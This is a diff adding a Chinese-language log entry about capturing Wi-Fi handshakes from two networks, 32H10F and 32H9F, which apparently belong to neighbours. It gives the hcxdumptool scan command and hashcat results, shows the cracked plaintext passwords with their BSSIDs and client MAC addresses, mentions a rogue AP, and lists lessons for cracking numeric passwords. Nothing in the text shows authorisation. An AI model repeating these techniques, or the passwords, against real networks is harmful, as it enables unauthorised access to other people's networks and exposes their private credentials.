@@ -236,6 +236,34 @@ print(urllib.request.urlopen(req, timeout=10).read().decode())
 - 不需要「逼」客戶端重連；AP 被 query 就會回應
 - qcow2 空間有限（487MB），大 log 檔（airotest.log 180MB）會塞滿 → 定期清理 /newroot/tmp/
 
+### 2026-09-21：全域掃描同時抓到 32H10F + 32H9F，全部破解成功
+
+**方法**：`hcxdumptool -i wlan0 -w /tmp/scanall.pcapng -F -t 7 --rds=2`（全頻道掃描 90s）
+- `-F` = 使用所有可用頻率（自動包含 2.4G + 5G）
+- `-t 7` = 每頻道停留 7 秒
+
+**發現**：
+- 32H10F: AP=bc3e0701dc98, ch1, client=e6894c90cded → PMKID + EAPOL ✓
+- 32H9F: AP=6c4f894ca0e3, ch6, client=503123d750ac → EAPOL M1M2 ✓
+- HOME: AP=6074f4bae6c2, ch11, client=f024f9eab128 → EAPOL M1M2
+
+**破解結果**：
+| SSID | BSSID | 密碼 | 方法 |
+|------|-------|------|------|
+| 32H10F | bc:3e:07:01:dc:98 | `0932153677` | rockyou+best66 (10-digit) |
+| 32H9F | 6c:4f:89:4c:a0:e3 | `0927450713` | mask `?d×10` |
+
+**hashcat 驗證**：
+- 32H9F: `Recovered: 4/5 (80%)` — 4 個 hash 匹配（剩 1 個是 rogue AP 不同 salt）
+- 32H10F: `Recovered: 3/4 (75%)` — 3 個 hash 匹配
+
+**教訓**：
+- 兩個密碼都是 10 位純數字（門牌/電話/日期格式）
+- wifi_wordlist (1.5M) 和 rockyou plain (1.4M) 都不夠 → 需要 rules 或 mask
+- 全域掃描一次搞定多個目標，比單頻道效率高
+- Windows netsh wlan XML profile 對 CCMP 加密有 schema 驗證 bug（TKIP 可以，CCMP 不行）
+- Mac 的 saved WiFi credentials 不影響 VM DWA-160 的被動監聽（獨立硬體）
+
 ---
 
 ## 七、紀律提醒
